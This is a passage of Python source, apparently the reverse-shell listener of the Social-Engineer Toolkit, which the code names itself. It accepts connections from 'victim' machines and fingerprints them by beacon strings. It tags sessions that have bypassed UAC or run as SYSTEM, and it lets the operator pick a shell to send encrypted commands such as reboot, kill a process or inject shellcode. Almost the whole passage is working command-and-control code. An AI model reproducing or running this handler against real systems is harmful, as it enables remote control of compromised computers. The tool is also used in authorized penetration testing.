                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption)

                    print(data)

                # reboot server
                if data == "reboot now":
                    data = "reboot"
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption)

                    print(data)

                # if data is equal to pid kill
                if data == "kill":
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # send the pid of the packet we want
                    send_packet(pid_number, conn, encryption)

                    # wait for confirmation that it was killed
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)

                    print("[*] Process has been killed with PID: " + pid_number)

                    data = conn.recv(1024)

                # if we are executing a command on the local operating system
                if data == "exec":
                    # execute the command via subprocess
                    proc = subprocess.Popen(
                        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    # pipe output for stdout and stderr
                    stdout_value = proc.stdout.read()
                    stderr_value = proc.stderr.read()
                    data = stdout_value + stderr_value
                    print(data)

           # if data is equal to shellcode
                if data == "shellcode":

                    # send that we want to use shellcode to execute
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)
                    # send the file line by line to the system
                    send_packet(shellcode_inject, conn, encryption)

        # handle the main exceptions
        except Exception as e:
            print("[!] Something went wrong printing error: " + str(e))
            log(e)
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))
            sys.exit()  # exit_set()

        if data == "quit" or data == "exit" or data == "back":
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))

    print_status(
        "The Social-Engineer Toolkit (SET) is listening on: 0.0.0.0:" + str(PORT))

    # define basic dictionary
    global d
    d = {}

    # function for updating dictionary
    def update_dict(conn, addr):
            # update dictionary
        d[conn] = addr[0]

    def call_connections(d, garbage1, garbage2, garbage3):
        global count
        count = 2
        counter = 1

        if false_shell == False:

                    # if tab_complete == True:
                    #        completer = Completer2()
                    #        readline.set_completer(completer.complete)

            while 1:
                try:
                    print("*** Pick the number of the shell you want ***\n")
                    for records in d.items():
                        if records[1] != "127.0.0.1":
                            print(str(counter) + ": " + records[1])
                            counter += 1
                    print("\n")
                    # allow us to see connections running in the background
                    choice = input(setprompt("0", ""))
                    choice = int(choice)
                    # if our choice is invalid because the user entered a
                    # higher number than what was listed, we then cycle back
                    # through the loop
                    if choice > counter - 1:
                        print("[!] Invalid choice, please enter a valid number to interact with.")
                    if choice <= counter - 1:
                        break
                    counter = 1

                except ValueError:
                    counter = 1
                    if choice == "quit" or choice == "exit" or choice == "back":
                        print_status("Returning back to the main menu.")
                        break
                    if len(choice) != 0:
                        choice = str(choice)
                        print("[!] Invalid choice, please enter a valid number to interact with.")

            if choice == "quit" or choice == "exit" or choice == "back":
                choice = 1
                sockobj = socket.socket(AF_INET, SOCK_STREAM)
                sockobj.connect(('', PORT))

            choice = int(choice) - 1

            # counter to dictionary
            dict_point = 0

            for records in d.items():

                # pull our socket handle
                if choice == dict_point:

                    # grab socket handler
                    conn = records[0]
                    # grab address
                    addr = records[1]

                    # needed to unhose address name and to identify if we need to add
                    # additional flags. This is a temporary workaround, will add a full
                    # fledge handler of flags soon.
                    #
                    # addr = addr.replace(":UAC-Safe", "")
                    # addr = addr.replace("WINDOWS:SYSTEM", "")
                    # addr = addr.replace(":POSIX", "")
                    # addr = addr.replace(":WINDOWS:UAC-SAFE", "")
                    # addr = addr.replace(":WINDOWS", "")

                    # call our shell handler
                    thread.start_new_thread(
                        handle_connection, (conn, addr, encryption, operating_system))

                # increment dict_point until we hit choice
                dict_point += 1

    try:
        while 1:

            if tab_complete == True:
                completer = Completer2()
                readline.set_completer(completer.complete)

            # connection and address for victim
            conn, addr = mysock.accept()

            # bypass counter
            bypass_counter = 0

            # if for some reason we got something connecting locally just bomb
            # out
            if addr[0] == "127.0.0.1":
                conn.close()
                sys.exit()  # pass

            # here we test to see if the SET shell is really there or someone
            # connected to it.
            false_shell = False
            if addr[0] != "127.0.0.1":
                try:
                    # we set a 5 second timeout for socket to send data
                    data = conn.recv(27)

                except Exception as e:
                    print(e)
                    false_shell = True

                # if it isn't windows
                if data != "IHAYYYYYIAMSETANDIAMWINDOWS":
                    # if it isn't nix
                    if data != "IHAYYYYYIAMSETANDIAMPOSIXXX":
                        false_shell = True

                # if we have a windows shell
                if data == "IHAYYYYYIAMSETANDIAMWINDOWS":

                    if os.path.isfile(userconfigpath + "system.address"):
                        fileopen = open(userconfigpath + "system.address", "r")
                        system = fileopen.read().rstrip()
                        system = system.replace(":WINDOWS", "")
                        system = system.replace(":UAC-SAFE", "")
                        if str(addr[0]) == str(system):
                            temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                            bypass_counter = 1

                    if os.path.isfile(userconfigpath + "uac.address"):
                        fileopen = open(userconfigpath + "uac.address", "r")
                        uac = fileopen.read().rstrip()
                        uac = uac.replace(":WINDOWS", "")
                        if str(addr[0]) == str(uac):
                            temp_addr = str(addr[0] + ":WINDOWS:UAC-SAFE")
                            bypass_counter = 1

                    if bypass_counter != 1:
                        temp_addr = str(addr[0] + ":WINDOWS")

                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn, temp_addr)
                    operating_system = "windows"
                    bypass_counter = 1

                # if we have a nix shell
                if data == "IHAYYYYYIAMSETANDIAMPOSIXXX":
                    temp_addr = str(addr[0] + ":POSIX")
                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn, temp_addr)
                    operating_system = "posix"
                    bypass_counter = 1

            if bypass_counter == 0:
                if addr[0] != "127.0.0.1":
                    if false_shell == False:
                        update_dict(conn, addr)

            # reset value
            # if uac != None:
            if os.path.isfile(userconfigpath + "uac.address"):
                os.remove(userconfigpath + "uac.address")
                bypass_counter = 0

            if os.path.isfile(userconfigpath + "system.address"):
                os.remove(userconfigpath + "system.address")
                bypass_counter = 0

            if addr[0] != "127.0.0.1":
                if false_shell == False:
                    print("[*] Connection received from: " + addr[0] + "\n")

            # set the counter if we get more threads that are legitimate
            if false_shell == False:
                count += 1

            try:

                # the first time we try this we dont want to start anything
                # else
                if count == 1:
                            # call our main caller handler
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(
                        call_connections, (d, garbage1, garbage2, garbage3))

            except TypeError as e:  # except typerrors
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(
                    call_connections, (d, garbage1, garbage2, garbage3))

            except Exception as e:  # handle exceptions
                print("[!] Something went wrong. Printing error: " + str(e))
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(
                    call_connections, (d, garbage1, garbage2, garbage3))

    # handle control-c
    except KeyboardInterrupt:
        exit_menu()
        sys.exit(-1)

    # handle all exceptions
    except Exception as e:
        print_error("Something went wrong: ")
        print(bcolors.RED + str(e) + bcolors.ENDC)
        count = 2
        garbage1 = ""
        garbage2 = ""
        garbage3 = ""
        thread.start_new_thread(
            call_connections, (d, garbage1, garbage2, garbage3))
        log(e)
        sys.exit()

# if we are calling from cli
# if __name__ == '__main__':
start_listener()
